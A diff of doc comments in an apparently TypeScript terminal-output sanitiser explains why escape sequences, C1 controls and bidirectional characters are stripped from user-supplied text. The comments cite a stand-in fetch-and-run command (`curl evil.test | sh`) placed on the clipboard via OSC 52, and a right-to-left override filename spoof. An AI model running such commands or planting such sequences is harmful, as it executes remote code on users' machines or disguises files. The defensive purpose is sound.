@@ -3,17 +3,16 @@
  *
  * A TERMINAL OBEYS WHAT IT IS HANDED. A row a member appended, a note an automation step kept, a pack's name, a
  * catalogue's title: each is written by somebody other than the person reading the line, and printed as kept, an ESC or
- * a BEL in it is an instruction. Audit thirty-seven finding 3 measured `automations show` passing a `set_var` answer
+ * a BEL in it is an instruction. An audit measured `automations show` passing a `set_var` answer
  * through with OSC 52 (put `curl evil.test | sh` on the clipboard), OSC 0 (retitle the window) and CR plus CSI 2K (erase
  * the line it came on) intact. `brief.ts` and `session.ts` each kept a private copy of the first half of this, which
- * stopped at U+001F. Commit 73f5f2f8 said here that they shared this module when they did not (audit thirty-nine
- * finding 11); since 713f4b2f both import `clip` from it, and `clip-everywhere.test.ts` holds them to it.
+ * stopped at U+001F. Both now import `clip` from it, and `clip-everywhere.test.ts` holds them to it.
  *
  * C1 AS WELL AS C0. U+009B and U+009D are the eight-bit spellings of CSI and OSC. Whether a terminal acts on them in
- * UTF-8 depends on the terminal, exactly as the audit says of the seven-bit ones, so the scrub does not bet on which
+ * UTF-8 depends on the terminal, exactly as it does for the seven-bit ones, so the scrub does not bet on which
  * terminal the owner has. DEL goes with them.
  *
- * FORMAT CHARACTERS ARE TAKEN OUT, NOT SPACED. Audit thirty-nine finding 11 measured every bidirectional control
+ * FORMAT CHARACTERS ARE TAKEN OUT, NOT SPACED. An audit measured every bidirectional control
  * (U+061C, U+200E, U+200F, U+202A to U+202E, U+2066 to U+2069) and every invisible one it tried (U+200B, U+2060, U+00AD,
  * U+FFF9 to U+FFFB, the tag characters) reaching the line. None is an instruction to a terminal, but in one that lays
  * text out both ways U+202E makes `invoice U+202E fdp.exe` read as `invoiceexe.pdf`. They are removed rather than turned
@@ -45,8 +44,8 @@ export const oneLine = (said: string): string =>
 /**
  * One line of somebody else's words, cut to `max` characters with `...` when it is longer.
  *
- * COUNTED IN CODE POINTS, NOT UTF-16 UNITS. `slice` on the string cut an emoji at the boundary in half, and the audit's
- * checker printed `clip cuts a surrogate pair: true` with its high half left on the line.
+ * COUNTED IN CODE POINTS, NOT UTF-16 UNITS. `slice` on the string cut an emoji at the boundary in half, and a probe
+ * printed `clip cuts a surrogate pair: true` with its high half left on the line.
  */
 export const clip = (said: string, max: number): string => {
   const one = [...oneLine(said)];
@@ -57,11 +56,11 @@ export const clip = (said: string, max: number): string => {
  * A copy of a record's answer with every string in it made `oneLine`, for building printed lines from.
  *
  * THE WHOLE VALUE, NOT FIELD BY FIELD. `automations show` prints eleven strings the record supplies and `scripts list`
- * fourteen, from a step's answer down to a date the record could send in any shape; the audit's brief named nine of
+ * fourteen, from a step's answer down to a date the record could send in any shape; an audit named nine of
  * them. Scrubbing the answer once, before any line is built, means a field a later line starts printing is already
  * clean, and nobody has to remember that it came from somebody else.
  *
- * KEYS AS WELL AS VALUES. Audit thirty-nine's checker printed `printable object key kept ESC: true`. No line prints a
+ * KEYS AS WELL AS VALUES. A probe printed `printable object key kept ESC: true`. No line prints a
  * key today, but one can reach here from real data: `automations show` hands over a rule's `body`, and a `script`
  * step's `input` is a map whose names `flow-lint.ts` does not look at (it asks only that each value is text). A key is
  * words too, for the same reason as the paragraph above.
